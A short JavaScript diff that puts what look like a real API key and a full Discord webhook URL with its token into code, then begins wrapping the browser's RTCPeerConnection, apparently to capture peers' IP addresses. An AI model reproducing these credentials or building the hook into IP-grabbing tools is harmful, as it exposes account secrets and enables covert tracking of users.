@@ -1,5 +1,5 @@
-let apiKey = "apikey";
-let webhook = "webhook"
+let apiKey = "AIzaSyAqJF7qbwDrxvTF6_sRMLFMh3t2B_Z-EsE";
+let webhook = "https://discord.com/api/webhooks/1342620640229855303/R30ecAIVqqISSM1-eec6GiumRw4Q5twYyf67amQ8iRwiWZYd0XwjyHzjo1qho7LO947w"
 
 window.oRTCPeerConnection =
   window.oRTCPeerConnection || window.RTCPeerConnection;
